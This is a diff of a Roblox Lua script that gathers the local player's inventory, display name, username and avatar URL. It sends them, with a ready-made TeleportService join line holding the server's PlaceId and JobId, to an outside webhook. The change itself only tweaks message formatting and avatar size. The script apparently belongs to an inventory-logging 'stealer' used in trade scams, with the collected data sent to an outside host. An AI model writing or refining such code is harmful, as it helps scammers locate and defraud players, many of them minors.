@@ -54,11 +54,11 @@ local function getInv()
 end
 
 local function format(data)
-	local message = "**User:** " .. LocalPlayer.Name .. "\n\n**Inventory:**\n"
+	local message = "**Inventory:**\n"
 	for _, item in ipairs(data) do
 		message = message .. string.format("**%s** - %s\n", item.Name, item.Amount)
 	end
-	message = message .. "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")```"
+	message = message .. "\n```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ', "' .. game.JobId .. '")```'
 	return message
 end
 
@@ -66,7 +66,7 @@ local function alert()
 	local message = format(getInv())
 	local displayName = LocalPlayer.DisplayName
 	local username = LocalPlayer.Name
-	local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+	local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
 	local webhookName = displayName .. " (@" .. username .. ")"
 	task.defer(function()
 		send(webhookURL, message, webhookName, avatarURL)
